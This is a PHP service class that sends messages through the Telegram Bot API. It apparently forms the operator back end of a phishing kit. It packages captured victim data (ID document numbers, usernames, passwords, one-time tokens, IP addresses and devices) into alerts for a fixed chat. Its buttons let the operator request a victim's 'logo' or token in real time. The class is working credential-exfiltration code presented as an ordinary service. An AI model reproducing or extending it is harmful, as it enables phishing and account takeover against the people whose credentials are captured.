<?php

declare(strict_types=1);

namespace App\Services;

use App\Config\Config;
use App\Exceptions\TelegramException;

/**
 * Telegram Service - Comunicación con Telegram Bot API
 * Implementa patrón Strategy para diferentes tipos de mensajes
 */
final class TelegramService
{
    private Config $config;
    private LoggerService $logger;
    private string $apiUrl;
    private string $chatId;
    private int $timeout;

    public function __construct(Config $config, LoggerService $logger)
    {
        $this->config = $config;
        $this->logger = $logger;
        $this->apiUrl = $config->get('telegram.api_url');
        $this->chatId = $config->get('telegram.chat_id');
        $this->timeout = $config->get('telegram.timeout');
    }

    /**
     * Envía un mensaje con botones inline
     */
    public function sendMessage(string $message, array $buttons = []): bool
    {
        $endpoint = $this->apiUrl . '/sendMessage';

        $data = [
            'chat_id' => $this->chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
        ];

        if (!empty($buttons)) {
            $data['reply_markup'] = json_encode(['inline_keyboard' => $buttons]);
        }

        return $this->makeRequest($endpoint, $data);
    }

    /**
     * Responde a un callback query
     */
    public function answerCallbackQuery(string $callbackId, string $text = ''): bool
    {
        $endpoint = $this->apiUrl . '/answerCallbackQuery';

        $data = [
            'callback_query_id' => $callbackId,
            'text' => $text ?: '⏳ Procesando...',
        ];

        return $this->makeRequest($endpoint, $data);
    }

    /**
     * Edita el markup de un mensaje (elimina/cambia botones)
     */
    public function editMessageReplyMarkup(int $messageId, array $buttons = []): bool
    {
        $endpoint = $this->apiUrl . '/editMessageReplyMarkup';

        $data = [
            'chat_id' => $this->chatId,
            'message_id' => $messageId,
            'reply_markup' => json_encode(['inline_keyboard' => $buttons]),
        ];

        return $this->makeRequest($endpoint, $data);
    }

    /**
     * Genera botones estándar para el sistema
     */
    public function generateStandardButtons(string $sessionId): array
    {
        return [
            [
                ['text' => '❌ Error Documento', 'callback_data' => "error_documento:$sessionId"],
                ['text' => '✅ Pedir Logo', 'callback_data' => "pedir_logo:$sessionId"],
            ],
            [
                ['text' => '❌ Error Logo', 'callback_data' => "error_logo:$sessionId"],
                ['text' => '🔑 Pedir Token', 'callback_data' => "pedir_token:$sessionId"],
            ],
            [
                ['text' => '🏁 Finalizar', 'callback_data' => "finalizar:$sessionId"],
            ],
        ];
    }

    /**
     * Formatea datos de sesión para Telegram
     */
    public function formatSessionData(array $sessionData): string
    {
        $lines = ['🔔 <b>NUEVA ACTIVIDAD</b>', ''];

        if (isset($sessionData['documentType'], $sessionData['documentNumber'])) {
            $lines[] = '📄 <b>Documento:</b>';
            $lines[] = "   • Tipo: {$sessionData['documentType']}";
            $lines[] = "   • Número: {$sessionData['documentNumber']}";
            $lines[] = '';
        }

        if (isset($sessionData['usuario'], $sessionData['clave'])) {
            $lines[] = '🔑 <b>Credenciales:</b>';
            $lines[] = "   • Usuario: {$sessionData['usuario']}";
            $lines[] = "   • Clave: {$sessionData['clave']}";
            $lines[] = '';
        }

        if (isset($sessionData['token'])) {
            $lines[] = '🎯 <b>Token:</b> ' . $sessionData['token'];
            $lines[] = '';
        }

        if (isset($sessionData['ip'])) {
            $lines[] = '🌐 <b>IP:</b> ' . $sessionData['ip'];
        }

        if (isset($sessionData['user_agent'])) {
            $lines[] = '📱 <b>Dispositivo:</b> ' . substr($sessionData['user_agent'], 0, 50);
        }

        $lines[] = '';
        $lines[] = '⏰ <b>Hora:</b> ' . date('Y-m-d H:i:s');

        return implode("\n", $lines);
    }

    /**
     * Realiza la petición HTTP a Telegram API
     */
    private function makeRequest(string $endpoint, array $data): bool
    {
        $ch = curl_init($endpoint);

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($data),
            CURLOPT_TIMEOUT => 1,
            CURLOPT_CONNECTTIMEOUT => 1,
            CURLOPT_NOSIGNAL => 1,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);

        if ($httpCode !== 200) {
            $this->logger->error('Telegram API Error', [
                'http_code' => $httpCode,
                'response' => $result,
                'curl_error' => $curlError,
                'endpoint' => $endpoint,
            ]);
            return false;
        }

        $this->logger->debug('Telegram message sent', [
            'endpoint' => $endpoint,
            'http_code' => $httpCode,
        ]);

        return true;
    }
}
